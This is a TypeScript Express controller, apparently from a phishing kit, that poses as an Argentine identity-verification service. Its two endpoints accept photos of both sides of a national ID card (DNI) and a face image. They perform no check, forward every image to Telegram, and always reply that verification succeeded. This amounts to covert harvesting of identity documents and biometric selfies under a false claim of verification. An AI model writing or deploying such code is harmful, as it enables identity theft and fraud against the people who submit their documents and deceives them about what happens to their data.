// 📄 Controlador de verificación
import { Request, Response } from 'express';
import { AuthRequest } from '../middleware/auth.middleware';
import { sendDNINotification, sendFacialNotification } from '../utils/telegram.service';

export const verifyDNI = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { frontImage, backImage } = req.body;

    if (!frontImage || !backImage) {
      res.status(400).json({ error: 'Se requieren ambas imágenes del DNI' });
      return;
    }

    // Enviar a Telegram
    await sendDNINotification({
      userId: req.userId || 'unknown',
      frontImage,
      backImage,
      timestamp: new Date().toLocaleString('es-AR'),
    });

    res.json({ success: true, message: 'DNI verificado exitosamente' });
  } catch (error) {
    console.error('Error en verificación DNI:', error);
    res.status(500).json({ error: 'Error al verificar DNI' });
  }
};

export const verifyFacial = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { faceImage, lightLevel } = req.body;

    if (!faceImage) {
      res.status(400).json({ error: 'Se requiere imagen facial' });
      return;
    }

    // Enviar a Telegram
    await sendFacialNotification({
      userId: req.userId || 'unknown',
      faceImage,
      lightLevel,
      timestamp: new Date().toLocaleString('es-AR'),
    });

    res.json({ success: true, message: 'Verificación facial exitosa' });
  } catch (error) {
    console.error('Error en verificación facial:', error);
    res.status(500).json({ error: 'Error al verificar rostro' });
  }
};
